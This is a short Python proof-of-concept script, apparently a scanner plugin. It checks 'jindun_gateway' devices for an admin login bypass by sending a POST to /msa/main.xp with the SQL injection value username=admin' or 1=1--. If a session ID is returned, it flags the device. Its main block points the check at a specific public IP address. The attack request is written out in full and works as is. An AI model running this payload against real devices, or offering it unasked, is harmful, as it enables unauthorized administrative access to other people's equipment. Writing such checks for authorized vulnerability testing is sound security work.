#!/usr/bin/env python
#-*- coding:utf-8 -*-

import urlparse

def assign(service, arg):
    if service == "jindun_gateway":
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    poc = arg+'msa/main.xp'
    raw = '''POST /msa/main.xp HTTP/1.1
Host: 127.0.0.1:443
Connection: keep-alive
Content-Length: 47
Origin: https://127.0.0.1
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept: */*
DNT: 1
Referer: https://127.0.0.1/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8
Cookie: msalogonaccount=; ys-main-help-panel=o%3Acollapsed%3Db%253A1; msasessionid=-1

Fun=msaAdminLogon&username=admin' or 1=1--&password=admin'''
    code, head, res, errcode, _ = curl.curl2(poc,raw=raw)
    if 'errtype:0,' in res and 'sessionid:' in res:
        security_hole("Router vulnerable!:"+poc)

if __name__ == '__main__':
    from dummy import *
    audit(assign('jindun_gateway', 'https://218.29.8.41/')[1])